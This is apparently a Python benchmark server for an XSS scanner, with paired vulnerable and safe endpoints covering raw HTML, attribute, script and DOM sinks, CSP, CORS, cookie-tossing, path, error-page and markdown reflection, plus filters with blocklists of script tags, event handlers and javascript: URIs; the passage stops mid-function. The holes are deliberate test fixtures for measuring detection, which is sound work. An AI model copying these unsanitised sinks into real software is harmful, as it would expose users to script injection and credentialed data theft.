#!/usr/bin/env python
"""XSSentinel Benchmark Server — manifest-driven reflection environment.

Serves HTTP endpoints that simulate vulnerable and safe reflection behaviors.
Each endpoint's rendering is determined by the "mode" field in manifest.json.
Used exclusively by the benchmark runner to evaluate scanner accuracy.

Usage:
    python benchmark/server.py [--port 18777]
"""
from __future__ import annotations

import base64
import html
import json
import os
import re
import sys
from html.parser import HTMLParser   # Phase 124: parser-aware resource unfurl
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, unquote, quote
import urllib.request               # Phase 124: resolve unfurled resources

_HERE = os.path.dirname(os.path.abspath(__file__))
_MANIFEST_PATH = os.path.join(_HERE, "manifest.json")
DEFAULT_PORT = 18777


# ---------------------------------------------------------------------------
# Page wrappers
# ---------------------------------------------------------------------------

def _page(body: str, headers: dict | None = None) -> tuple[int, dict, str]:
    """Wrap body in a minimal HTML page."""
    h = {"Content-Type": "text/html; charset=utf-8"}
    if headers:
        h.update(headers)
    return 200, h, f"<!DOCTYPE html><html><head><title>bench</title></head><body>{body}</body></html>"


def _page_raw(full_html: str, headers: dict | None = None) -> tuple[int, dict, str]:
    """Return a full HTML document as-is."""
    h = {"Content-Type": "text/html; charset=utf-8"}
    if headers:
        h.update(headers)
    return 200, h, full_html


# ---------------------------------------------------------------------------
# Vulnerable modes: raw reflection (no sanitization)
# ---------------------------------------------------------------------------

def m_raw_element(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_table(v: str) -> tuple: return _page(f"<table><tr><td>{v}</td></tr></table>")
def m_raw_element_nested(v: str) -> tuple: return _page(f"<div><p>{v}</p></div>")
def m_raw_element_span(v: str) -> tuple: return _page(f"<span>{v}</span>")
def m_raw_element_li(v: str) -> tuple: return _page(f"<ul><li>{v}</li></ul>")
def m_raw_element_embed(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_form(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_input(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_select(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_details(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_video(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_marquee(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_audio(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_a(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_div_tabindex(v: str) -> tuple: return _page(f"<div>{v}</div>")
def m_raw_element_body(v: str) -> tuple: return _page(f"<div {v}>content</div>")

def m_raw_attr_dq(v: str) -> tuple: return _page(f'<input type="text" value="{v}">')
def m_raw_attr_sq(v: str) -> tuple: return _page(f"<input type='text' value='{v}'>")
def m_raw_attr_nq(v: str) -> tuple: return _page(f"<img src={v}>")
def m_raw_attr_dq_href(v: str) -> tuple: return _page(f'<a href="{v}">click</a>')
def m_raw_attr_dq_src(v: str) -> tuple: return _page(f'<img src="{v}">')
def m_raw_attr_dq_action(v: str) -> tuple: return _page(f'<form action="{v}"><input type="submit"></form>')
def m_raw_attr_dq_event(v: str) -> tuple: return _page(f'<div onmouseover="{v}">hover me</div>')
def m_raw_attr_dq_style(v: str) -> tuple: return _page(f'<div style="{v}">styled</div>')
def m_raw_attr_dq_formaction(v: str) -> tuple: return _page(f'<form><button formaction="{v}">go</button></form>')
def m_raw_attr_dq_data(v: str) -> tuple: return _page(f'<object data="{v}">obj</object>')

def m_raw_script_string_dq(v: str) -> tuple: return _page(f'<script>var x = "{v}";</script>')
def m_raw_script_string_sq(v: str) -> tuple: return _page(f"<script>var x = '{v}';</script>")
def m_raw_script_block(v: str) -> tuple: return _page(f"<script>{v}</script>")
def m_raw_script_template(v: str) -> tuple: return _page(f"<script>var x = `{v}`;</script>")
def m_raw_script_comment(v: str) -> tuple: return _page(f"<script>/* {v} */</script>")
def m_raw_script_close(v: str) -> tuple: return _page(f'<script>var x = "{v}";</script>')

def m_raw_svg(v: str) -> tuple: return _page(f"<svg>{v}</svg>")
def m_raw_svg_attr(v: str) -> tuple: return _page(f'<svg><rect width="100" height="{v}"></svg>')
def m_raw_svg_onload(v: str) -> tuple: return _page(f'<svg onload="{v}">')
def m_raw_svg_animate(v: str) -> tuple: return _page(f"<svg>{v}</svg>")
def m_raw_svg_foreignobject(v: str) -> tuple: return _page(f"<svg><foreignObject>{v}</foreignObject></svg>")

def m_raw_math(v: str) -> tuple: return _page(f"<math><mtext>{v}</mtext></math>")
def m_raw_math_href(v: str) -> tuple: return _page(f'<math><a xlink:href="{v}">x</a></math>')

def m_raw_href_js(v: str) -> tuple: return _page(f'<a href="{v}">link</a>')
def m_raw_href_data(v: str) -> tuple: return _page(f'<a href="{v}">link</a>')
def m_raw_meta_refresh(v: str) -> tuple: return _page(f'<meta http-equiv="refresh" content="0;url={v}">')


def m_escape_meta_refresh_js(v: str) -> tuple:
    """Phase 168: a meta refresh whose value is escaped, so the payload keeps
    its ``javascript:`` scheme but loses the quotes that would let it break out
    of the attribute.

    This is the safe twin of ``raw_meta_refresh``, and the only shape that
    isolates the "meta refresh is a javascript: sink" claim: everything else the
    scanner sends here cannot break out, so a finding can only come from a
    detector still treating that scheme as execution.  Measured non-executing in
    Chromium -- see ``_p168_meta_probe.py`` and
    ``tests/test_phase35.py::test_meta_refresh_javascript_is_not_a_sink``.
    """
    return _page('<meta http-equiv="refresh" content="0;url='
                 f'{html.escape(v, quote=True)}">')


def m_raw_iframe_src(v: str) -> tuple: return _page(f'<iframe src="{v}"></iframe>')
def m_raw_iframe_srcdoc(v: str) -> tuple: return _page(f'<iframe srcdoc="{v}"></iframe>')
def m_raw_base_href(v: str) -> tuple: return _page(f'<base href="{v}">')

def m_raw_style_block(v: str) -> tuple: return _page(f"<style>{v}</style>")
def m_raw_comment(v: str) -> tuple: return _page(f"<!-- {v} -->")
def m_raw_cdata(v: str) -> tuple: return _page(f"<svg><![CDATA[{v}]]></svg>")
def m_raw_template(v: str) -> tuple: return _page(f"<div>{{{{ {v} }}}}</div>")
def m_raw_template_vue(v: str) -> tuple: return _page(f"<div v-pre>{{{{ {v} }}}}</div>")

def m_raw_url_decode(v: str) -> tuple:
    decoded = unquote(v)
    return _page(f"<div>{decoded}</div>")

def m_raw_double_decode(v: str) -> tuple:
    decoded = unquote(unquote(v))
    return _page(f"<div>{decoded}</div>")


# ---------------------------------------------------------------------------
# DOM-based modes: static pages with client-side vulnerabilities
# ---------------------------------------------------------------------------

def m_dom_hash_innerhtml(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>document.getElementById('out').innerHTML = location.hash.slice(1);</script>
</body></html>""")

# ---------------------------------------------------------------------------
# Phase 146: hash-ROUTED parameters (``#/route?q=``)
#
# pos-dom-01 above reads the WHOLE fragment (``location.hash.slice(1)``), so
# the engine's plain ``#MARKER`` probe satisfies it and it passes without ever
# parsing a fragment query string.  A real SPA router is different: the value
# sits inside the fragment's own query (``#/search?q=``), behind a route path
# that must be preserved.  Both official XSS challenges on OWASP Juice Shop
# are that shape and both went undetected -- the benchmark "had a hash case"
# and it was testing a different shape.  These two modes are the missing one.
# ---------------------------------------------------------------------------

def m_dom_hash_route_innerhtml(v: str) -> tuple:
    """Router-shaped fragment parameter reaching innerHTML."""
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>
function render(){
  var qs = (location.hash.split('?')[1] || '');
  var q = new URLSearchParams(qs).get('q');
  if (q) { document.getElementById('out').innerHTML = q; }
}
window.addEventListener('hashchange', render);
render();
</script>
</body></html>""")


def m_dom_hash_route_safe(v: str) -> tuple:
    """The same router shape, written as TEXT instead of HTML."""
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>
function render(){
  var qs = (location.hash.split('?')[1] || '');
  var q = new URLSearchParams(qs).get('q');
  if (q) { document.getElementById('out').textContent = q; }
}
window.addEventListener('hashchange', render);
render();
</script>
</body></html>""")


def m_dom_tt_wrapper_innerhtml(v: str) -> tuple:
    """Router-shaped fragment parameter reaching innerHTML as a NON-PRIMITIVE.

    Phase 151, locks the Phase 144 fix in dom_engine.has().  Angular (and any
    Trusted Types app) hands the innerHTML setter a TrustedHTML wrapper, not a
    string: typeof is 'object', and the old has() (typeof v === 'string') went
    silent on EVERY assignment of such pages.  The browser coerces the value
    via ToString when it parses, so the payload still executes -- a real
    vulnerability whose sink hook receives an object.

    A real TrustedHTML is created via a permissive policy when the runtime
    offers one (Chromium does, CSP or not); elsewhere a {toString} wrapper
    exercises the identical has() contract.  The policy is created once per
    document so hashchange re-renders keep wrapping (per-document names are
    single-use and a second createPolicy would throw).
    """
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>
var POL = null;
try {
  if (window.trustedTypes && trustedTypes.createPolicy) {
    POL = trustedTypes.createPolicy('probePolicy',
            { createHTML: function(s){ return s; } });
  }
} catch (e) { POL = null; }
function render(){
  var qs = (location.hash.split('?')[1] || '');
  var q = new URLSearchParams(qs).get('q');
  if (!q) { return; }
  var val = POL ? POL.createHTML(q) : { toString: function(){ return q; } };
  document.getElementById('out').innerHTML = val;
}
window.addEventListener('hashchange', render);
render();
</script>
</body></html>""")


def m_dom_tt_wrapper_safe(v: str) -> tuple:
    """The identical wrapper shape, written as TEXT (textContent is not a sink)."""
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>
var POL = null;
try {
  if (window.trustedTypes && trustedTypes.createPolicy) {
    POL = trustedTypes.createPolicy('probePolicy',
            { createHTML: function(s){ return s; } });
  }
} catch (e) { POL = null; }
function render(){
  var qs = (location.hash.split('?')[1] || '');
  var q = new URLSearchParams(qs).get('q');
  if (!q) { return; }
  var val = POL ? POL.createHTML(q) : { toString: function(){ return q; } };
  document.getElementById('out').textContent = val;
}
window.addEventListener('hashchange', render);
render();
</script>
</body></html>""")


def m_dom_search_eval(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<script>var p = new URLSearchParams(location.search); eval(p.get('x'));</script>
</body></html>""")

def m_dom_postmessage(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script>window.addEventListener('message', function(e) {
  document.getElementById('out').innerHTML = e.data;
});</script>
</body></html>""")

def m_dom_hash_docwrite(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<script>document.write(location.hash.slice(1));</script>
</body></html>""")

def m_dom_jquery_html(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<div id="out"></div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>$('#out').html(location.hash.slice(1));</script>
</body></html>""")

def m_dom_hash_settimeout(v: str) -> tuple:
    return _page_raw("""<!DOCTYPE html><html><body>
<script>setTimeout(location.hash.slice(1));</script>
</body></html>""")


# ---------------------------------------------------------------------------
# Safe modes: various defenses applied before reflection
# ---------------------------------------------------------------------------

def m_escape_element(v: str) -> tuple: return _page(f"<div>{html.escape(v)}</div>")
def m_escape_attr_dq(v: str) -> tuple: return _page(f'<input type="text" value="{html.escape(v, quote=True)}">')
def m_escape_attr_sq(v: str) -> tuple: return _page(f"<input type='text' value='{html.escape(v, quote=True)}'>")
def m_escape_attr_nq(v: str) -> tuple:
    # For unquoted attributes, html.escape is insufficient (spaces break out).
    # Use alphanumeric-only whitelist to be truly safe.
    safe = re.sub(r"[^a-zA-Z0-9_\-.]", "", v)
    return _page(f"<input value={safe}>")

def m_escape_script_string(v: str) -> tuple:
    # Proper JS string escaping: backslash-escape dangerous chars
    escaped = v.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r").replace("</", "<\\/")
    return _page(f'<script>var x = "{escaped}";</script>')

def m_escape_href(v: str) -> tuple:
    # URL-encode the value so javascript: becomes javascript%3A (inert in href)
    return _page(f'<a href="{quote(v, safe="")}">link</a>')

def m_rcdata_textarea(v: str) -> tuple: return _page(f"<textarea>{v}</textarea>")
def m_rcdata_title(v: str) -> tuple: return _page_raw(f"<!DOCTYPE html><html><head><title>{v}</title></head><body><p>content</p></body></html>")
def m_rcdata_xmp(v: str) -> tuple: return _page(f"<xmp>{v}</xmp>")
def m_rcdata_textarea_script(v: str) -> tuple: return _page(f"<textarea><b>{v}</b></textarea>")

# Escaped RCDATA twins (Phase 96): the raw modes above are EXPLOITABLE via
# the closing-tag breakout whenever markup echoes verbatim, so the safe
# semantics need these html.escape variants -- there, both a direct
# injection AND the breakout come back entity-encoded (inert).
def m_escape_rcdata_textarea(v: str) -> tuple: return _page(f"<textarea>{html.escape(v, quote=True)}</textarea>")
def m_escape_rcdata_title(v: str) -> tuple: return _page_raw(f"<!DOCTYPE html><html><head><title>{html.escape(v, quote=True)}</title></head><body><p>content</p></body></html>")
def m_escape_rcdata_xmp(v: str) -> tuple: return _page(f"<xmp>{html.escape(v, quote=True)}</xmp>")
def m_escape_rcdata_textarea_script(v: str) -> tuple: return _page(f"<textarea><b>{html.escape(v, quote=True)}</b></textarea>")

def m_comment_stripped(v: str) -> tuple:
    # Strip -- and > to prevent comment breakout
    safe = v.replace("--", "").replace(">", "").replace("<", "")
    return _page(f"<!-- {safe} -->")

def m_comment_encoded(v: str) -> tuple:
    return _page(f"<!-- {html.escape(v)} -->")

def m_attr_quotes_stripped(v: str) -> tuple:
    # Strip quotes, angle brackets, and spaces to prevent all breakout vectors
    safe = v.replace('"', "").replace("'", "").replace("`", "")
    safe = safe.replace("<", "").replace(">", "").replace(" ", "")
    return _page(f'<input type="text" value="{safe}">')

def m_attr_alnum_whitelist(v: str) -> tuple:
    safe = re.sub(r"[^a-zA-Z0-9_\-]", "", v)
    return _page(f'<div class="{safe}">content</div>')

def m_attr_data_escaped(v: str) -> tuple:
    return _page(f'<div data-id="{html.escape(v, quote=True)}">content</div>')

def m_attr_angle_stripped(v: str) -> tuple:
    # Strip angle brackets AND quotes to prevent both tag injection and
    # attribute breakout.
    safe = v.replace("<", "").replace(">", "").replace('"', "").replace("'", "")
    return _page(f'<input type="text" value="{safe}">')

# --- CSP-protected (raw reflection + strict Content-Security-Policy) ---
_CSP_STRICT = {"Content-Security-Policy": "script-src 'self'; object-src 'none'; base-uri 'none'"}
_CSP_NONE = {"Content-Security-Policy": "default-src 'none'; script-src 'none'"}
_CSP_NONCE = {"Content-Security-Policy": "script-src 'nonce-k8Fj3x9Qm2Rw7Yp4'"}

def m_csp_strict_element(v: str) -> tuple: return _page(f"<div>{v}</div>", _CSP_STRICT)
def m_csp_strict_href(v: str) -> tuple: return _page(f'<a href="{v}">link</a>', _CSP_NONE)
def m_csp_nonce_element(v: str) -> tuple: return _page(f"<div>{v}</div>", _CSP_NONCE)
def m_csp_strict_attr(v: str) -> tuple: return _page(f'<input value="{v}">', _CSP_STRICT)

# --- Phase 98: nonce + 'unsafe-inline' (the shape every modern app ships,
# and the shape the corpus never covered until it produced a false
# positive).  Per CSP Level 2+ the browser IGNORES 'unsafe-inline' when the
# policy carries a nonce, so bare inline reflection does NOT execute:
#   * no-leak variant  -> SAFE (nothing to exploit; the nonce never reaches
#     the attacker), and it is the regression anchor for Phase 98.
#   * leak variant     -> VULNERABLE: the nonce is in the page, so the
#     Phase 36 nonce-reuse layer can legitimately fire a script that
#     carries it (must NOT be collateral damage of the tighter gate).
#   * ui-only variant  -> VULNERABLE: without a nonce, 'unsafe-inline'
#     really does allow inline execution (no false negative).
_NONCE_VAL = "k8Fj3x9Qm2Rw7Yp4"          # >=8 chars (extractor minimum)
_CSP_NONCE_UI = {"Content-Security-Policy":
                 "default-src 'self'; script-src 'strict-dynamic' "
                 f"'nonce-{_NONCE_VAL}' 'unsafe-inline'"}
_CSP_UI_ONLY = {"Content-Security-Policy": "script-src 'self' 'unsafe-inline'"}

def m_csp_nonce_ui_element(v: str) -> tuple:
    """nonce + unsafe-inline, nonce NOT leaked into the page -> safe."""
    return _page(f"<div>{v}</div>", _CSP_NONCE_UI)

def m_csp_nonce_ui_leak(v: str) -> tuple:
    """nonce + unsafe-inline, nonce leaked in a <script> tag -> exploitable."""
    return _page(f'<script nonce="{_NONCE_VAL}">var a=1;</script>'
                 f'<div>{v}</div>', _CSP_NONCE_UI)

def m_csp_ui_element(v: str) -> tuple:
    """'unsafe-inline' without a nonce -> inline really executes."""
    return _page(f"<div>{v}</div>", _CSP_UI_ONLY)

# --- Phase 98: multi-position reflection (same param echoed twice with
# DIFFERENT escaping).  Real templates do this constantly; the verifier
# only inspects the FIRST occurrence, so these lock in that the payload
# corpus still reaches the exploitable one.
def m_multi_escaped_then_raw(v: str) -> tuple:
    """Escaped attribute echo first, raw element echo second -> exploitable."""
    return _page(f'<div class="echo" title="{html.escape(v, quote=True)}">e</div>'
                 f'<div class="raw">{v}</div>')

def m_multi_textarea_then_raw(v: str) -> tuple:
    """RCDATA (inert) echo first, raw element echo second -> exploitable."""
    return _page(f'<textarea name="q">{v}</textarea>'
                 f'<div class="raw">{v}</div>')

# --- JSONP with callback validation ---
def m_jsonp_whitelist(v: str) -> tuple:
    # Only allow alphanumeric + dot + underscore callback names
    if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_.]*$", v):
        v = "defaultCallback"
    data = json.dumps({"status": "ok"})
    body = f"{v}({data});"
    return 200, {"Content-Type": "application/javascript"}, body

def m_jsonp_wrapped(v: str) -> tuple:
    if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_.]*$", v):
        v = "defaultCallback"
    data = json.dumps({"status": "ok"})
    body = f"if(typeof {v} === 'function') {{ {v}({data}); }}"
    return 200, {"Content-Type": "application/javascript"}, body

# --- Tag/keyword filtering ---
def m_filter_script_tag(v: str) -> tuple:
    # Strip script tags AND dangerous HTML tags with event handlers
    safe = re.sub(r"(?i)</?script[^>]*>", "", v)
    safe = re.sub(r"(?i)<[^>]*\bon\w+\s*=[^>]*>", "", safe)
    safe = re.sub(r"(?i)</?(?:svg|img|iframe|embed|object|video|audio|body|input|form|button|details|marquee|select|textarea)\b[^>]*>", "", safe)
    return _page(f"<div>{safe}</div>")

def m_filter_event_handlers(v: str) -> tuple:
    # Strip on*= event handlers AND script tags (both are XSS vectors)
    safe = re.sub(r"(?i)\bon\w+\s*=", "", v)
    safe = re.sub(r"(?i)</?script[^>]*>.*?(?:</script>|$)", "", safe, flags=re.S)
    safe = re.sub(r"(?i)</?script[^>]*>", "", safe)
    return _page(f"<div>{safe}</div>")

def m_filter_javascript_uri(v: str) -> tuple:
    # Strip javascript: AND data: URIs (both can execute script)
    safe = re.sub(r"(?i)javascript\s*:", "", v)
    safe = re.sub(r"(?i)data\s*:[^,]*,", "", safe)
    safe = re.sub(r"(?i)vbscript\s*:", "", safe)
    return _page(f'<a href="{safe}">link</a>')

def m_filter_angle_brackets(v: str) -> tuple:
    safe = v.replace("<", "").replace(">", "")
    return _page(f"<div>{safe}</div>")

def m_filter_keywords(v: str) -> tuple:
    # Strip dangerous function calls AND script/svg tags entirely
    safe = re.sub(r"(?i)(alert|prompt|confirm|eval|function|setTimeout|setinterval|fetch|xmlhttprequest)\s*\(", "blocked(", v)
    safe = re.sub(r"(?i)</?script[^>]*>.*?(?:</script>|$)", "", safe, flags=re.S)
    safe = re.sub(r"(?i)</?script[^>]*>", "", safe)
    safe = re.sub(r"(?i)<[^>]*\bon\w+\s*=[^>]*>", "", safe)
    return _page(f"<div>{safe}</div>")

def m_filter_recursive_script(v: str) -> tuple:
    # Strip null bytes first (common bypass vector), then recursively remove scripts
    safe = v.replace("\x00", "").replace("%00", "")
    prev = None
    while prev != safe:
        prev = safe
        safe = re.sub(r"(?i)<script\b[^>]*>.*?</script>", "", safe, flags=re.S)
    # Also strip event handler tags as secondary defense
    safe = re.sub(r"(?i)<[^>]*\bon\w+\s*=[^>]*>", "", safe)
    return _page(f"<div>{safe}</div>")

# --- Output encoding ---
def m_output_urlencoded(v: str) -> tuple:
    return _page(f"<div>{quote(v, safe='')}</div>")

def m_output_base64(v: str) -> tuple:
    encoded = base64.b64encode(v.encode()).decode()
    return _page(f"<div data-encoded=\"{encoded}\">encoded content</div>")

def m_double_encode_safe(v: str) -> tuple:
    decoded = unquote(v)
    return _page(f"<div>{html.escape(decoded)}</div>")

def m_case_lower_strip(v: str) -> tuple:
    safe = re.sub(r"<[^>]*>", "", v.lower())
    return _page(f"<div>{safe}</div>")

# --- JSON context (proper escaping) ---
def m_json_string_escaped(v: str) -> tuple:
    # json.dumps produces a properly escaped JSON string literal.
    # Additionally escape < and > to prevent </script> breakout in HTML context.
    safe = json.dumps(v)[1:-1]  # strip outer quotes
    safe = safe.replace("<", "\\u003c").replace(">", "\\u003e")
    return _page(f'<script>var data = "{safe}";</script>')

def m_json_object_value(v: str) -> tuple:
    obj = json.dumps({"user_input": v})
    # Escape < > to prevent script breakout in HTML-embedded JSON
    obj = obj.replace("<", "\\u003c").replace(">", "\\u003e")
    return _page(f"<script>var data = {obj};</script>")

# --- Header-only reflection ---
def m_header_only(v: str) -> tuple:
    return _page("<div>static content, no reflection in body</div>",
                 {"X-Reflected-Input": v})

# --- Phase 172: reflection reachable ONLY through a LATE injectable header ---
#
# Phase 171 removed the `INJECTABLE_HEADERS[:6]` slice from the header
# carrier, and no existing case could have caught that class of bug: every
# other header case either reflects a query PARAMETER or echoes into a
# RESPONSE header (neg-header-01), so nothing depended on the scanner
# actually sending entry #7 or beyond.  `True-Client-IP` is entry 7 -- with
# the slice in place these endpoints are a false negative / a true negative;
# without it, a true positive / still a true negative.  That is the contract
# this pair locks (mirrors Juice Shop's build/routes/saveLoginIp.js:55, which
# reads exactly this header).
def m_late_header_reflect(v: str, ctx: dict) -> tuple:
    """Vulnerable: the True-Client-IP request header is rendered RAW into the
    body.  The query parameter is ignored on purpose -- the payload has to
    arrive through that header or not at all."""
    late = (ctx.get("headers") or {}).get("True-Client-IP", "")
    return _page(f'<div id="client-ip">{late}</div>')


def m_late_header_reflect_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: same header, HTML-escaped -- reflection without execution."""
    late = html.escape((ctx.get("headers") or {}).get("True-Client-IP", ""),
                       quote=True)
    return _page(f'<div id="client-ip">{late}</div>')

# --- Safe JS sinks ---
def m_js_textcontent(v: str) -> tuple:
    escaped = v.replace("\\", "\\\\").replace('"', '\\"').replace("</", "<\\/")
    return _page(f'<div id="out"></div><script>document.getElementById("out").textContent = "{escaped}";</script>')

def m_js_console_log(v: str) -> tuple:
    escaped = v.replace("\\", "\\\\").replace('"', '\\"').replace("</", "<\\/")
    return _page(f'<script>console.log("{escaped}");</script>')

# --- Misc safe ---
def m_select_option_escaped(v: str) -> tuple:
    return _page(f"<select><option>{html.escape(v)}</option></select>")

def m_null_byte_strip(v: str) -> tuple:
    safe = v.replace("\x00", "").replace("%00", "")
    safe = re.sub(r"<[^>]*>", "", safe)
    return _page(f"<div>{safe}</div>")


# ---------------------------------------------------------------------------
# Mode registry
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Phase 109: vector families that previously had NO benchmark case.
#
# The layer profile (Phase 108) showed engines layers running with zero
# coverage: cookie injection, CORS, markdown, path injection, error pages
# (plus upload/stored, which need POST).  Those handlers get the REQUEST
# CONTEXT (headers/path/query) -- the plain MODES handlers only see the
# value of one query parameter, which cannot express "the Cookie header is
# echoed" or "the URL path is echoed".
# ---------------------------------------------------------------------------

def _cookie_value(ctx: dict, name: str) -> str:
    raw = (ctx.get("headers") or {}).get("Cookie") or ""
    for part in raw.split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            if k.strip() == name:
                return v.strip()
    return ""


def m_cookie_echo(v: str, ctx: dict) -> tuple:
    """Vulnerable: the `lang` cookie is rendered into the page raw."""
    return _page(f'<div>Language: {_cookie_value(ctx, "lang")}</div>')


def m_cookie_echo_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: same echo, HTML-escaped."""
    val = html.escape(_cookie_value(ctx, "lang"), quote=True)
    return _page(f'<div>Language: {val}</div>')


def m_cookie_toss_parent(v: str, ctx: dict) -> tuple:
    """Vulnerable: Set-Cookie with a Domain= BROADER than the response host.

    Cookie tossing needs a parent/child domain pair, and this case supplies one
    with no DNS or hosts-file work: the manifest asks for ``host=sub.localhost``
    (see ``runner._build_target_url``) and ``*.localhost`` resolves to loopback
    under RFC 6761.  The cookie is scoped to ``.localhost``, so it is delivered
    to *sibling* origins as well -- exactly the relation
    ``cookie_tossing.is_parent_domain_cookie`` tests
    (``host.endswith("." + domain)``).

    No user input is interpolated on purpose: this layer keys on the header, and
    a reflecting page would add unrelated findings to the case.
    """
    return _page("<div>Theme: light</div>",
                 {"Set-Cookie": "theme=light; Domain=.localhost; Path=/"})


def m_cookie_toss_self(v: str, ctx: dict) -> tuple:
    """Safe twin: same page, same cookie name, scoped to the response host.

    ``Domain=sub.localhost`` equals the response host, so the cookie never
    reaches a sibling origin and there is nothing to toss.  That single change
    is the premise this layer actually tests -- a safe twin that altered some
    other field would prove nothing.
    """
    return _page("<div>Theme: light</div>",
                 {"Set-Cookie": "theme=light; Domain=sub.localhost; Path=/"})


def m_path_echo(v: str, ctx: dict) -> tuple:
    """Vulnerable: the LAST path segment is echoed raw into the body.

    The segment is percent-DECODED first, like any real framework/router
    would: a payload arriving as %3Csvg...%3E must render as <svg...> for
    the reflection to be exploitable at all.
    """
    seg = unquote((ctx.get("path") or "").rstrip("/").rsplit("/", 1)[-1])
    if not seg or seg == "pth01":
        seg = v  # fall back to the query value so a plain GET still renders
    return _page(f'<div>Resource: {seg}</div>')


def m_path_echo_escaped(v: str, ctx: dict) -> tuple:
    seg = unquote((ctx.get("path") or "").rstrip("/").rsplit("/", 1)[-1])
    if not seg or seg == "pth01":
        seg = v
    return _page(f'<div>Resource: {html.escape(seg, quote=True)}</div>')


def m_error_echo(v: str, ctx: dict) -> tuple:
    """Vulnerable: a 404 page echoes the requested path (status 404 is
    required -- the error_xss layer only counts non-2xx reflection)."""
    path = unquote(ctx.get("path") or "")
    return (404, {"Content-Type": "text/html; charset=utf-8"},
            "<!DOCTYPE html><html><head><title>bench</title></head><body>"
            f"<h1>Not Found</h1><p>No such page: {path}</p></body></html>")


def m_error_echo_escaped(v: str, ctx: dict) -> tuple:
    path = html.escape(unquote(ctx.get("path") or ""), quote=True)
    return (404, {"Content-Type": "text/html; charset=utf-8"},
            "<!DOCTYPE html><html><head><title>bench</title></head><body>"
            f"<h1>Not Found</h1><p>No such page: {path}</p></body></html>")


def m_cors_reflect(v: str, ctx: dict) -> tuple:
    """Vulnerable: echoes ANY Origin back with credentials allowed."""
    origin = (ctx.get("headers") or {}).get("Origin") or ""
    hdrs = {}
    if origin:
        hdrs["Access-Control-Allow-Origin"] = origin
        hdrs["Access-Control-Allow-Credentials"] = "true"
    return _page('<div>{"account": "12345", "balance": 100}</div>', hdrs)


def m_cors_whitelist(v: str, ctx: dict) -> tuple:
    """Safe twin: only a fixed trusted origin is allowed."""
    origin = (ctx.get("headers") or {}).get("Origin") or ""
    hdrs = {}
    if origin == "https://trusted.example":
        hdrs["Access-Control-Allow-Origin"] = origin
        hdrs["Access-Control-Allow-Credentials"] = "true"
    return _page('<div>{"account": "12345", "balance": 100}</div>', hdrs)


def _md_minimal(v: str, allow_raw_links: bool) -> str:
    """A deliberately tiny markdown subset: [t](u) and ![a](s).

    Vulnerable mode keeps the URL scheme as given (so javascript: survives
    into href/src); safe mode drops non-http(s) schemes and escapes the
    text/url before interpolating.
    """
    if not allow_raw_links:
        # A safe renderer escapes ALL raw markup up front; markdown's own
        # syntax characters ([ ] ( )) survive html.escape, so the link
        # rewriting below still works on the escaped text.  Without this,
        # anything that is NOT markdown syntax (a bare <b>, a quote) went
        # through raw and the "safe" twin was trivially exploitable.
        v = html.escape(v, quote=True)
    out = []
    i = 0
    while i < len(v):
        img = v.startswith("![", i)
        link = (not img) and v.startswith("[", i)
        if img or link:
            close = v.find("]", i + (2 if img else 1))
            if close != -1 and close + 1 < len(v) and v[close + 1] == "(":
                end = v.find(")", close + 2)
                if end != -1:
                    text = v[i + (2 if img else 1):close]
                    url = v[close + 2:end]
                    if not allow_raw_links:
                        if url.lower().startswith(("javascript:", "data:",
                                                   "vbscript:")):
                            url = "#blocked"
                        text = html.escape(text, quote=True)
                        url = html.escape(url, quote=True)
                    if img:
                        out.append(f'<img src="{url}" alt="{text}">')
                    else:
                        out.append(f'<a href="{url}">{text}</a>')
                    i = end + 1
                    continue
        out.append(v[i])
        i += 1
    return "".join(out)


def m_markdown_raw(v: str, ctx: dict) -> tuple:
    """Vulnerable: markdown rendered with the URL scheme intact."""
    return _page(f'<div>{_md_minimal(v, allow_raw_links=True)}</div>')


def m_markdown_filtered(v: str, ctx: dict) -> tuple:
    """Safe twin: dangerous schemes blocked and text/url escaped."""
    return _page(f'<div>{_md_minimal(v, allow_raw_links=False)}</div>')


# Modes whose handler needs the request context (headers / path).
# ---------------------------------------------------------------------------
# Phase 110: POST support, an in-memory store, and upload handlers.
#
# These cover the last two vector families that had a live detection layer
# and no benchmark case (Phase 108):
#   * upload  -- the app echoes the multipart FILENAME back (upload_probe)
#   * stored  -- a payload written via one request is rendered later by a
#                different URL (scanner_stored)
# ---------------------------------------------------------------------------

import cgi  # noqa: E402  (stdlib; only used for multipart parsing)
import email as _email  # noqa: E402

# inject-path -> [stored values]  (process-lifetime, like a real toy app)
_STORE: dict = {}
# view-path -> inject-path, built from the manifest (view_path field)
VIEW_TO_INJECT: dict = {}


def _parse_multipart_parts(content_type: str, body: bytes):
    """Return [(name, value, filename_or_None)] for a multipart body."""
    boundary = None
    for part in (content_type or "").split(";"):
        part = part.strip()
        if part.startswith("boundary="):
